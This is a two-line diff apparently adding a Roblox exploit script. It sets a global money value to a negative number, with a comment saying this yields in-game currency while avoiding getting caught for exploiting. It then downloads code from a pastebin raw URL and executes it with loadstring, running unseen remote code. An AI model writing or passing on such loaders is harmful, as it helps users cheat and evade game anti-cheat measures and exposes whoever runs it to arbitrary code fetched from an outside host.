@@ -1,0 +1,2 @@
+_G.Money = -160000 -- should be negative (gives 320,000 so you cant get caught for exploiting because you can buy 320,000 money)
+loadstring(game:HttpGet("https://pastebin.com/raw/AvtFzhUX"))()
